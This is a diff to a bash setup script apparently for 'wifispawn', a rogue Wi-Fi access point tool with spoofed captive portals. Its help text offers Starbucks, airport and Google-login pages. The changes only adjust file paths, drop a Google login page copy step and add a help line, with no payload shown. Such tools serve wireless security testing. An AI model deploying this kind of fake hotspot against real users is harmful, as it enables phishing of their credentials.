@@ -165,11 +165,6 @@ setup_directories() {
         fi
     done
     
-    # Copy additional files for google login if using google page
-    if [[ "$PAGE_TYPE" == "google" && -f "$PAGES_DIR/google-login.html" ]]; then
-        cp "$PAGES_DIR/google-login.html" "$WEB_DIR/google-login.html"
-    fi
-    
     echo -e "${GREEN}[+] Directories created${NC}"
 }
 
@@ -373,7 +368,7 @@ main() {
     
     # Generate configuration files
     local config_script=""
-    for search_path in "$SCRIPT_DIR/generate_configs.sh" "/opt/wifispawn/generate_configs.sh" "$(pwd)/generate_configs.sh"; do
+    for search_path in "$SCRIPT_DIR/misc/generate_configs.sh" "/opt/wifispawn/generate_configs.sh" "$(pwd)/misc/generate_configs.sh"; do
         if [[ -f "$search_path" ]]; then
             config_script="$search_path"
             break
@@ -381,7 +376,7 @@ main() {
     done
     
     if [[ -z "$config_script" ]]; then
-        echo -e "${RED}Error: generate_configs.sh not found!${NC}"
+        echo -e "${RED}Error: misc/generate_configs.sh not found!${NC}"
         echo -e "${YELLOW}Searched in: $SCRIPT_DIR, /opt/wifispawn, $(pwd)${NC}"
         exit 1
     fi
@@ -407,6 +402,7 @@ if [[ "$1" == "-h" || "$1" == "--help" ]]; then
     echo "  $0 'FreeWiFi' wlan0 portal"
     echo "  $0 'Starbucks_WiFi' wlan0 starbucks"
     echo "  $0 'Airport_WiFi' wlan0 airport"
+    echo "  $0 '-l or --list-pages' to list available portal pages"
     echo ""
     list_available_pages
     exit 0
